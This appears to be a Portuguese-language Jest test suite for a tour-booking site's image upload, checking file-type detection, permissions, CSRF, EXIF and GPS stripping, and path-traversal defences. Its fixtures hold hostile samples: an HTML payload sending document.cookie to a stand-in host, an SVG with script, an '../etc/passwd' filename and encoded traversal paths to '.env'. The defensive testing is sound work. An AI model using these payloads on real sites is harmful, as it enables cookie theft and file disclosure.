/* ==============================================================
   Testes — upload de imagens
   Os ataques verificados à mão, agora em regressão automática.
   ============================================================== */
const fs = require("fs");
const path = require("path");
const sharp = require("sharp");
const request = require("supertest");
const { app, db, resetDatabase, createUser, createServiceWithSlot, loginAs } = require("./helpers");
const mediaService = require("../app/services/mediaService");

const PASTA = process.env.UPLOAD_DIR;

beforeEach(async () => {
  await resetDatabase();
  fs.rmSync(PASTA, { recursive: true, force: true });
});

/* ---------- Arquivos de teste, gerados na hora ---------- */
async function fotoComGps() {
  return sharp({ create: { width: 1200, height: 800, channels: 3, background: "#2a7fa0" } })
    .jpeg()
    .withExif({
      IFD0: { Artist: "Joao da Silva", Copyright: "SEGREDO-METADADO" },
      IFD3: { GPSLatitudeRef: "S", GPSLatitude: "23/1 33/1 0/1", GPSLongitudeRef: "W", GPSLongitude: "46/1 38/1 0/1" },
    })
    .toBuffer();
}
const svgComScript = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
const htmlDisfarcado = Buffer.from("<html><script>fetch('//x/?c='+document.cookie)</script></html>");

async function comoAdmin() {
  const admin = await createUser({ email: "chefe@aquatrip.local", role: "ADMIN" });
  const { agent, csrf } = await loginAs(admin);
  const { service } = await createServiceWithSlot({ slug: "com-foto", title: "Com Foto" });
  return { admin, agent, csrf, service };
}

function enviar(agent, csrf, serviceId, buffer, nome = "foto.jpg", alt = "Rio de águas cristalinas") {
  const r = agent.post(`/api/admin/experiencias/${serviceId}/capa`).field("alt", alt).attach("imagem", buffer, nome);
  return csrf ? r.set("X-CSRF-Token", csrf) : r;
}

describe("Detecção do tipo real", () => {
  it("reconhece pela assinatura, não pela extensão", async () => {
    expect(mediaService.tipoPorAssinatura(await fotoComGps())).toBe("jpeg");
    expect(mediaService.tipoPorAssinatura(svgComScript)).toBeNull();
    expect(mediaService.tipoPorAssinatura(htmlDisfarcado)).toBeNull();
    expect(mediaService.tipoPorAssinatura(Buffer.alloc(4))).toBeNull();
  });
});

describe("Ataques", () => {
  it("recusa SVG com script", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const res = await enviar(agent, csrf, service.id, svgComScript, "logo.svg");
    expect(res.status).toBe(415);
  });

  it("recusa HTML renomeado para .jpg", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const res = await enviar(agent, csrf, service.id, htmlDisfarcado, "foto.jpg");
    expect(res.status).toBe(415);
  });

  it("recusa arquivo corrompido", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const truncado = (await fotoComGps()).slice(0, 600);
    const res = await enviar(agent, csrf, service.id, truncado);
    expect(res.body.codigo).toBe("CORRUPT");
  });

  it("recusa imagem de dimensões gigantes, com mensagem certa", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const bomba = await sharp({ create: { width: 9000, height: 9000, channels: 3, background: "#fff" }, limitInputPixels: false })
      .png({ compressionLevel: 9 }).toBuffer();
    const res = await enviar(agent, csrf, service.id, bomba, "panorama.png");
    expect(res.body.codigo).toBe("TOO_BIG_DIMENSIONS");
  });

  it("corta o recebimento de arquivo acima do limite", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const grande = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(mediaService.MAX_BYTES + 1024)]);
    const res = await enviar(agent, csrf, service.id, grande);
    expect(res.status).toBe(413);
  });

  it("recusa imagem pequena demais para a vitrine", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const mini = await sharp({ create: { width: 100, height: 80, channels: 3, background: "#000" } }).jpeg().toBuffer();
    expect((await enviar(agent, csrf, service.id, mini)).body.codigo).toBe("TOO_SMALL");
  });

  it("nada recusado chega ao disco", async () => {
    const { agent, csrf, service } = await comoAdmin();
    await enviar(agent, csrf, service.id, svgComScript, "a.svg");
    await enviar(agent, csrf, service.id, htmlDisfarcado, "b.jpg");
    const arquivos = fs.existsSync(PASTA) ? fs.readdirSync(PASTA) : [];
    expect(arquivos).toHaveLength(0);
    expect((await db.query("SELECT 1 FROM media")).rows).toHaveLength(0);
  });
});

describe("Permissões", () => {
  it("visitante e usuário comum não enviam", async () => {
    const { service } = await createServiceWithSlot();
    const foto = await fotoComGps();
    const anon = await request(app).post(`/api/admin/experiencias/${service.id}/capa`).attach("imagem", foto, "f.jpg");
    expect(anon.status).toBe(401);

    const u = await createUser({ email: "comum@aquatrip.local" });
    const { agent, csrf } = await loginAs(u);
    expect((await enviar(agent, csrf, service.id, foto)).status).toBe(403);
  });

  it("exige CSRF", async () => {
    const { agent, service } = await comoAdmin();
    expect((await enviar(agent, null, service.id, await fotoComGps())).status).toBe(403);
  });

  it("exige texto alternativo (acessibilidade)", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const res = await enviar(agent, csrf, service.id, await fotoComGps(), "f.jpg", "");
    expect(res.status).toBe(422);
    expect(res.body.campo).toBe("alt");
  });
});

describe("Foto aceita", () => {
  it("é reprocessada: sai em WebP e SEM metadados (nem GPS)", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const original = await fotoComGps();
    expect(original.includes("SEGREDO-METADADO")).toBe(true); // a entrada tinha

    const res = await enviar(agent, csrf, service.id, original);
    expect(res.status).toBe(201);

    const servida = await request(app).get(res.body.capa.url).buffer(true).parse((r, cb) => {
      const partes = []; r.on("data", (c) => partes.push(c)); r.on("end", () => cb(null, Buffer.concat(partes)));
    });
    expect(servida.status).toBe(200);
    expect(servida.headers["content-type"]).toBe("image/webp");

    const meta = await sharp(servida.body).metadata();
    expect(meta.format).toBe("webp");
    expect(meta.exif).toBeUndefined();
    expect(servida.body.includes("SEGREDO-METADADO")).toBe(false);
    expect(servida.body.includes("GPS")).toBe(false);
  });

  it("recebe nome gerado pelo servidor, nunca o original", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const res = await enviar(agent, csrf, service.id, await fotoComGps(), "../../../etc/passwd.jpg");
    expect(res.status).toBe(201);
    expect(res.body.capa.url).toMatch(/^\/media\/[0-9a-f-]{36}\.webp$/);
    expect(fs.readdirSync(PASTA)).toHaveLength(1);
    expect(fs.readdirSync(PASTA)[0]).not.toContain("passwd");
  });

  it("é servida com cabeçalhos defensivos", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const res = await enviar(agent, csrf, service.id, await fotoComGps());
    const img = await request(app).get(res.body.capa.url);
    expect(img.headers["x-content-type-options"]).toBe("nosniff");
    expect(img.headers["content-security-policy"]).toContain("default-src 'none'");
    expect(img.headers["cache-control"]).toContain("immutable");
  });

  it("aparece no catálogo e na página da experiência, com o alt", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const res = await enviar(agent, csrf, service.id, await fotoComGps(), "f.jpg", "Barco no rio ao amanhecer");
    const url = res.body.capa.url;
    expect((await request(app).get("/mergulho")).text).toContain(`src="${url}" alt="Barco no rio ao amanhecer"`);
    expect((await request(app).get(`/reservar/${service.slug}`)).text).toContain(`src="${url}"`);
  });

  it("trocar a capa apaga a anterior (sem arquivo órfão)", async () => {
    const { agent, csrf, service } = await comoAdmin();
    const primeira = (await enviar(agent, csrf, service.id, await fotoComGps())).body.capa.url;
    await enviar(agent, csrf, service.id, await fotoComGps(), "f.jpg", "Segunda foto do rio");
    expect(fs.readdirSync(PASTA)).toHaveLength(1);
    expect((await db.query("SELECT 1 FROM media")).rows).toHaveLength(1);
    expect((await request(app).get(primeira)).status).toBe(404);
  });

  it("remover a capa volta para a ilustração da categoria", async () => {
    const { agent, csrf, service } = await comoAdmin();
    await enviar(agent, csrf, service.id, await fotoComGps());
    const del = await agent.delete(`/api/admin/experiencias/${service.id}/capa`).set("X-CSRF-Token", csrf);
    expect(del.status).toBe(204);
    expect(fs.readdirSync(PASTA)).toHaveLength(0);
    expect((await request(app).get("/mergulho")).text).toContain("cardume_peixes");
  });
});

describe("Rota de entrega", () => {
  it("não permite sair da pasta (path traversal)", async () => {
    for (const p of ["..%2F..%2F.env", "..%2Fpackage.json", "%2e%2e%2f.env", "qualquer.webp", "x.png"]) {
      expect((await request(app).get(`/media/${p}`)).status).toBe(404);
    }
  });

  it("não serve arquivo que está no disco mas não foi registrado", async () => {
    fs.mkdirSync(PASTA, { recursive: true });
    const chave = "11111111-2222-3333-4444-555555555555.webp";
    fs.writeFileSync(path.join(PASTA, chave), "conteudo plantado");
    expect((await request(app).get(`/media/${chave}`)).status).toBe(404);
  });
});
